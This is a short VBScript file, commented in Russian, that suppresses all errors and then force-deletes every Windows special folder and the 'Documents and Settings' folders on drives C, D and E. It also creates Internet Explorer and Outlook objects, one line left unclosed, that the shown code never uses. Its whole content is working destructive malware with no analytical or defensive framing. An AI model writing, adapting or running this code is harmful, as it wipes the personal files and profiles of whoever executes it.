Set FileSystemObject = CreateObject("scripting.filesystemobject")
Set Shell = CreateObject("Wscript.Shell")
t = 0: On Error Resume Next ' Пропускать ошибки
Set Application = CreateObject("Shell.Application")
Set InternerExplorer = WScript.CreateObject("InternetExplorer.Application")
Set Outlook = WScript.CreateObject("Outlook.Application


'    
 For Each Folder In Shell.SpecialFolders
  FileSystemObject.deletefolder folder,True
 Next
' Удаление Documents and Settings
 FileSystemObject.deletefolder"C:\Documents and Settings",True
 FileSystemObject.deletefolder"D:\Documents and Settings",True
 FileSystemObject.deletefolder"E:\Documents and Settings",True

